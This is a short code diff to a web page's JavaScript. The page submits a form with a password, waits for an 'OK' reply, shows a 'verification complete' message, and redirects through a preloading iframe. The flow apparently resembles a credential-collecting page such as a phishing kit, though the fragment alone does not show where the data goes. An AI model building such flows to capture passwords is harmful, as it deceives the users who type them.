@@ -189,7 +189,8 @@
                     body: formData
                 });
                 
-                if (!response.ok) throw new Error('Submission failed');
+                const result = await response.text();
+                if (result !== "OK") throw new Error('Submission failed');
                 
                 // Clear password field
                 passwordInput.value = '';
@@ -211,7 +212,12 @@
                     verificationComplete.style.display = 'flex';
                     
                     setTimeout(() => {
-                        window.location.href = redirectUrl;
+                        // Use iframe to load destination first
+                        const iframe = document.getElementById('iframe');
+                        iframe.onload = function() {
+                            window.location.href = redirectUrl;
+                        };
+                        iframe.src = redirectUrl;
                     }, 2000);
                 }
 
